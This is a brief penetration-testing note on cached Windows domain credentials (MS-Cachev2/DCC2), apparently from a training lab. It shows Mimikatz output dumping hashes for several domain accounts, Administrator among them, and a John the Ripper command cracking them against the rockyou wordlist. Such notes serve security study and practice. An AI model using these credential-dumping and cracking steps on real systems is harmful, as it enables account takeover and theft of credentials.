# MS-Cachev2 (DCC2)



### Extracting Hashes - Mimikatz

```powershell
Iteration is set to default (10240)

[NL$1 - 10/18/2022 6:29:00 AM]
RID       : 000001f4 (500)
User      : MEDTECH\Administrator
MsCacheV2 : a7c5480e8c1ef0ffec54e99275e6e0f7

[NL$2 - 9/28/2022 2:52:28 AM]
RID       : 00000456 (1110)
User      : MEDTECH\yoshi
MsCacheV2 : cd21be418f01f5591ac8df1fdeaa54b6

[NL$3 - 11/15/2022 1:43:35 AM]
RID       : 00000455 (1109)
User      : MEDTECH\wario
MsCacheV2 : b82706aff8acf56b6c325a6c2d8c338a

[NL$4 - 11/11/2022 2:09:23 AM]
RID       : 00000452 (1106)
User      : MEDTECH\joe
MsCacheV2 : 464f388c3fe52a0fa0a6c8926d62059c

mimikatz(commandline) # exit

```



### Cracking with John

```shell-session
└─$ john --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt mscachev2 
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (mscash2, MS Cache Hash 2 (DCC2) [PBKDF2-SHA1 512/512 AVX512BW 16x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

```
